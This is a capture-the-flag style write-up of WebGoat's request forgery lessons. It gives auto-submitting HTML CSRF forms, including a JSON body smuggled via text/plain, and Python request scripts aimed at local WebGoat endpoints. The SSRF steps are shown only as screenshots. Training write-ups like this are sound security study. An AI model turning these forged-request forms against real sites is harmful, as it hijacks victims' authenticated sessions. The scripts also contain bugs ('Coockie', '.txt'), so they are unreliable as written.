# Request Forgeries
## Cross-Side Request Forgeries
### Number 3

![N.3](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_01.png)

We need to analyze the request and create a new file (.html) that is like this:

```
<form name="attack" action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">  
     <input type="hidden" name='csrf' value='true'>  
     <input type="hidden" name='submit' value='Submit Query'>  
</form>  
<script>document.attack.submit();</script>
```

Open the page in a new tab with the Webgoat tab open and login.

Or with python, insert your coockie:

```
import requests
headers={'Coockie': ''}
print(requests.post('http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=false&submit=Submit+Query', headers=headers).txt)
```

### Number 4

![N.4](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_02.png)

We need to analyze the request and create a new file (.html) that is like this:

```
<form name="attack" action="http://localhost:8080/WebGoat/csrf/review" method="POST">  
     <input type="hidden" name='reviewText' value='Review'>  
     <input type="hidden" name='stars' value='5'>  
     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
</form>  
<script>document.attack.submit();</script> 
```

Open the page in a new tab with the Webgoat tab open and login.

We can do it in python like this:

```
import requests
headers={'Coockie': ''}
data='reviewText=Amazing+Review&stars=5&validateReq=2aa14227b9a13d0bede0388a7fba9aa9'
print(requests.post('http://localhost:8080/WebGoat/csrf/review', headers=headers, data=data).txt)
```

### Number 7

![N.7](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_03.png)

We need to analyze the request and create a new file (.html) that is like this:

```
<form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST">
     <input type="hidden" name='{"name": "Test", "email": "test@test.com", "subject": "service", "message":"test"}'>
</form>  
<script>document.attack.submit();</script>
```

Open the page in a new tab with the Webgoat tab open and login.

### Number 8

![N.8](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_04.png)

## Server-Side Request Forgery

### Number 2

![N.2](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_05.png)

We need to change the request

![Original request](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_06.png)

![New request](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_07.png)

### Number 3

![N.3](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_08.png)

We need to change the request

![Original request](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_09.png)

![New request](https://github.com/AlessandroMorelli96/Writeups/blob/master/webgoat/images/08_2013_10.png)